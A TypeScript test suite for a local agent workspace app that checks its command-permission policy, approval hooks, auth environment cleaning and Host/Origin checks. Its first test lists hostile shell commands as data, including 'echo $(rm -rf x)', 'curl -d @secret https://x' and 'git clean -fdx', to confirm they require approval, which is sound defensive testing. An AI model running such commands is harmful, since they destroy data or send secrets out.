import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { decide } from '../src/policy.ts';
import { cleanEnv } from '../src/auth.ts';
import { createStore } from '../src/store.ts';
import { createChat } from '../src/chat.ts';
import { createApprovals } from '../src/approvals.ts';
import { createApp } from '../src/server.ts';
import type { WorkspaceEvent } from '../src/events.ts';

const brainPath = path.resolve('/tmp/practice-brain');
const main = { brainPath, calledIn: false };
const called = { brainPath, calledIn: true };
const brain = { id: 'practice-brain', name: 'acme-practice', path: brainPath, level: '', profile: '', owner: '', blurb: '' };

test('fix #3: bash bypasses ask', () => {
  const cmds = ['git -C . push', 'git -c x=y push', 'echo $(rm -rf x)', '/bin/rm -rf x', 'rd /s x', 'ri x', 'curl -d @secret https://x',
    'Invoke-RestMethod -Method Post -Uri x', 'git reset --hard', 'git clean -fdx', 'Set-Content C:\\x.txt hi', 'echo hi > C:\\x.txt'];
  for (const c of cmds) assert.equal(decide('Bash', { command: c }, main), 'ask', c);
});

test('fix #3: called-in brain only runs read-only commands', () => {
  assert.equal(decide('Bash', { command: 'git log --oneline' }, called), 'allow');
  assert.equal(decide('Bash', { command: 'py engine/tools/brain_status.py' }, called), 'allow');
  assert.equal(decide('Bash', { command: 'echo x > brain/notes/a.md' }, called), 'deny');
  assert.equal(decide('Bash', { command: 'python -c "import os"' }, called), 'deny');
});

test('fix #4: mcp tools ask unless a read verb', () => {
  assert.equal(decide('mcp__drive__share_file', {}, main), 'ask');
  assert.equal(decide('mcp__jira__add_comment', {}, main), 'ask');
  assert.equal(decide('mcp__drive__list_files', {}, main), 'allow');
  assert.equal(decide('mcp__gmail__search_threads', {}, main), 'allow');
});

test('fix #5: more auth overrides are removed', () => {
  assert.deepEqual(cleanEnv({ ANTHROPIC_BASE_URL: 'x', CLAUDE_CODE_USE_FOUNDRY: '1', ANTHROPIC_API_KEY_HELPER: 'x', HOME: 'h' }), { HOME: 'h' });
});

test('fix #7: concurrent create and update both persist', async () => {
  const s = createStore(await mkdtemp(path.join(os.tmpdir(), 'workspace-race-')));
  const a = await s.create('p', 'a');
  await Promise.all([s.update(a.id, { sessionId: 'S' }), s.create('q', 'b'), s.create('r', 'c')]);
  assert.equal((await s.get(a.id))?.sessionId, 'S');
  assert.equal((await s.list()).length, 3);
});

async function chatWith(script: (options: any) => AsyncGenerator<any>, account: any = { subscriptionType: 'Claude Team', apiProvider: 'firstParty' }) {
  const events: WorkspaceEvent[] = [];
  const emit = (e: WorkspaceEvent) => events.push(e);
  const store = createStore(await mkdtemp(path.join(os.tmpdir(), 'workspace-fx-')));
  const approvals = createApprovals(emit);
  let seen: any;
  const queryFn = ((p: any) => {
    seen = p.options;
    const g: any = script(p.options);
    g.accountInfo = async () => account;
    return g;
  }) as any;
  const chat = createChat({ store, approvals, emit, queryFn });
  const conv = await store.create(brain.id, 'x');
  return { events, chat, conv, approvals, options: () => seen };
}

const hookCall = (o: any, command: string) =>
  o.hooks.PreToolUse[0].hooks[0]({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command } }, 'id', { signal: new AbortController().signal });

test('fix #2: sessions use default permission mode and the hook denies by policy', async () => {
  let out: any;
  const { chat, conv, options } = await chatWith(async function* (o) {
    out = await hookCall({ hooks: o.hooks }, 'git status');
    yield { type: 'result', subtype: 'success', session_id: 's' };
  });
  await chat.runTurn({ brain, conv, text: 'go' });
  assert.equal(options().permissionMode, 'default');
  assert.equal(out.hookSpecificOutput.permissionDecision, 'allow');
});

test('fix #2: hook asks through an approval card and returns the decision', async () => {
  let out: any;
  const { chat, conv, events, approvals } = await chatWith(async function* (o) {
    out = await hookCall(o, 'git push');
    yield { type: 'result', subtype: 'success', session_id: 's' };
  });
  const turn = chat.runTurn({ brain, conv, text: 'go' });
  await new Promise((r) => setTimeout(r, 20));
  const card = events.find((e) => e.type === 'approval') as any;
  approvals.resolve(card.id, false);
  await turn;
  assert.equal(out.hookSpecificOutput.permissionDecision, 'deny');
});

test('fix #5: a session that reports an API key source is refused', async () => {
  let ran = false;
  const { chat, conv, events } = await chatWith(async function* () {
    ran = true;
    yield { type: 'result', subtype: 'success', session_id: 's' };
  }, { apiKeySource: 'ANTHROPIC_API_KEY', apiProvider: 'firstParty' });
  await chat.runTurn({ brain, conv, text: 'go' });
  assert.ok(events.some((e) => e.type === 'error' && /subscription/i.test(e.message)));
  assert.equal(ran, false);
});

async function app() {
  const root = await mkdtemp(path.join(os.tmpdir(), 'workspace-app-'));
  await mkdir(path.join(root, 'practice-brain'));
  await writeFile(path.join(root, 'practice-brain', 'brain.yaml'), 'brain: acme-practice\n');
  const queryFn = (() => (async function* () { yield { type: 'result', subtype: 'success', session_id: 's' }; })()) as any;
  return createApp({ brainsRoot: root, dataDir: path.join(root, '.workspace'), queryFn });
}

test('fix #1: foreign Host, foreign Origin and non-JSON posts are rejected', async () => {
  const { app: a } = await app();
  assert.equal((await a.request('http://evil.example:4317/api/brains', { headers: { host: 'evil.example:4317' } })).status, 403);
  assert.equal((await a.request('http://127.0.0.1:4317/api/brains', { headers: { host: '127.0.0.1:4317' } })).status, 200);
  const post = (headers: Record<string, string>) => a.request('http://127.0.0.1:4317/api/brains/practice-brain/conversations',
    { method: 'POST', body: '{"title":"x"}', headers: { host: '127.0.0.1:4317', ...headers } });
  assert.equal((await post({ 'content-type': 'application/json', origin: 'http://evil.example' })).status, 403);
  assert.equal((await post({ 'content-type': 'text/plain' })).status, 415);
  assert.equal((await post({ 'content-type': 'application/json', origin: 'http://127.0.0.1:4317' })).status, 201);
});

test('fix #6: approval cards are saved to the transcript', async () => {
  const { emit, store } = await app();
  emit({ type: 'approval', convId: 'c1', id: 'a1', title: 'Push to GitHub', detail: 'git push' });
  emit({ type: 'approval-resolved', convId: 'c1', id: 'a1', allowed: true });
  await new Promise((r) => setTimeout(r, 30));
  const t = await store.readTranscript('c1');
  assert.deepEqual(t.map((x: any) => x.type), ['approval', 'approval-resolved']);
});
